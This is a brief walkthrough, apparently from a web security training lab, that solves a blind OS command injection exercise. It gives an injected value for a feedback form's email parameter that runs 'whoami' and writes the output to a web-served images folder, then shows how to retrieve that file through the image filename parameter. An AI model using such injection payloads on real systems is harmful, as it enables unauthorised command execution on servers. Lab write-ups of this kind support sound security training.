# Lab: Blind OS command injection with output redirection

Intercept the feedback request and modify the email parameter to be `email=||whoami>/var/www/images/output.txt||`

Intercept a product page request and modify the image GET to be `filename=output.txt`

See that the response returns the content from the injected OS command.